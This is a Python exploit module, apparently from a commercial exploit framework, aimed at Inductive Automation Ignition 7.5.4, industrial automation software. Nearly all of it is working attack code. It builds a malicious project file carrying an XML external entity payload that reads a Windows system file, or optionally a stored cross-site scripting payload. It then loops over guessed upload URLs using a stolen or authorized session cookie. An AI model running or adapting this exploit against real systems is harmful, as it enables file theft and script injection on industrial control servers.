from Sploit import Sploit
from collections import OrderedDict
import string
import urllib
import urllib2
import time
from WebHelper import FormPoster

INFO = {}
INFO['NAME'] = "efs_inductive_automation_ignition_7_5_4_xxe/xss"
INFO['DESCRIPTION'] = "Inductive Automation Ignition 7.5.4 XXE/XSS"
INFO['VENDOR'] = "https://inductiveautomation.com/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """This flaw lies within "Upload project" functionality at /main/web/config/conf.projects.
Authorized user may upload *.proj file containing malicious XML, which will result in arbitrary file disclosure or stored XSS.
Arbitrary file contents will be put into one of a few columns of "Projects" table.
XSS is triggered once a user visits "Projects" page.
Since this application uses dynamic link generation, the module may fail to upload XML as it tries to guess the right upload link.
Authorization is required.
Tested on Windows 7 x64.
"""
INFO['DOWNLOAD_LINK'] = "https://inductiveautomation.com/downloads/ignition"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = ""
INFO['PATH'] = "Exploits/General"
INFO['AUTHOR'] = "29 Nov 2018, Gleg Team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.57", dict(description='Target host')
OPTIONS["PORT"] = 8088, dict(description='Target port')
OPTIONS["BASEPATH"] = '/'
OPTIONS["SSL"] = False, dict(description="Use SSL?")
OPTIONS["JSESSIONID"] = "", dict(description="Authorized JSESSIONID cookie value")
OPTIONS["PAYLOAD"] = dict(options=["File Disclosure (XXE)", "XSS"], selected="File Disclosure (XXE)"), dict(description="Payload type")

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.host = '127.0.0.1'
        self.port = 8088
        self.protocol = 'http'
        self.cookie = ''
        self.basepath = '/'
        self.xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE abc [<!ENTITY ent SYSTEM "file:///c:/Windows/win.ini">]>
<project>
<version>
  <major>7</major>
  <minor>5</minor>
  <rev>4</rev>
  <build>1206</build>
</version>
<timestamp>2018-11-20 02:00:41</timestamp>
<id>0</id>
<name>{PAYLOAD}</name>
<title></title>
<description>description</description>
<enabled>true</enabled>
<lastModified>1542707933733</lastModified>
<lastModifiedBy>admin</lastModifiedBy>
<editCount>2</editCount>
<uuid>ed4bb536-4a40-907e-9000-2fa81a560321</uuid>
<resources>
	<resource id='0' name='' module='' modver='7.5.4.1206' type='sr.global.props' ver='0' dirty='false' editcount='2' parent='' oemlocked='false' scope='7'>
		<doc></doc>
		<bytes><![CDATA[H4sIAAAAAAAAAG1PMY7CMBAck0CAClEhKiQqmogeGkQBuoK7LxhjwMiOUeLwC6BD94ZrTuIXx3Ou
oWWNKbHsnVnt7Hr2e3D+md4/Pq/H23h++f0DUAHYZnj67+P9adKrA1HhcmINIFnJNS+1oyymXkGY
EBZBntjlTgrnswgYCWtSla1K4dRB8tJZw52yWao2mXoSEhiCfW59WzrTdsn1V273RfAWCe1ZDWgX
0k1Kt6XiWmm54EZSoUpfG0JG17ZenlnHB+YnNIIRsG4QIa74rnqYiaTJwn5gvReJ/ZoPYNMU7CkB
AAA=]]></bytes></resource>
</resources>
<deletedResources>
</deletedResources>
</project>"""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.protocol = 'https' if self.args.get("SSL", False) else 'http'
        self.cookie = self.args.get("JSESSIONID", self.cookie)
        if not self.cookie:
            self.log('This module requires authorized JSESSIONID cookie. Please enter it to JSESSIONID field and restart module.')
            self.finish(False)
        self.basepath = self.args.get("BASEPATH", self.basepath)
        if self.basepath == '/':
            self.basepath = ''
        else:
            self.basepath = '/' + self.basepath.strip('/')
        payload_type = self.args.get("PAYLOAD", 'File Disclosure (XXE)')
        if payload_type == 'File Disclosure (XXE)':
            self.xml = self.xml.format(PAYLOAD='&ent;')
        elif payload_type == 'XSS':
            self.xml = self.xml.format(PAYLOAD='XSS&lt;script&gt;alert(\'xss\');&lt;/script&gt;')


    def upload_xee(self):
        url = '{}://{}:{}{}/main/web/?wicket:interface=:'.format(self.protocol, self.host, self.port, self.basepath)
        url += '{}:config-contents:form:{}:IFormSubmitListener::'
        self.log('Trying to guess the right upload link.')
        self.log('If the upload fails increase the upper limit of the upload_xee() method loops, restart the server or upload project file manually (using XML from this module)')
        #  increase those loops upper limit if needed
        for i in range(1, 21):
            for j in range(1, 21):
                form = FormPoster()
                form.add_field('id33_hf_0', '')
                form.add_file('upload', 'xee.proj', self.xml, False, 'application/octet-stream')
                form.add_field(':submit', 'Upload')
                url_ = url.format(i, j)
                req = form.post(url_)
                req.add_header('Cookie', 'JSESSIONID={}'.format(self.cookie))
                try:
                    r = urllib2.urlopen(req)
                    if r.getcode() == 200:
                        return True
                except urllib2.HTTPError as ex:
                    pass
        return False

    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        if self.upload_xee():
            self.log('Done! Check {}://{}:{}{}/main/web/config/conf.projects'.format(self.protocol, self.host, self.port, self.basepath))
            self.finish(True)
        else:
            self.log('Upload failed')
            self.finish(False)
        

if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()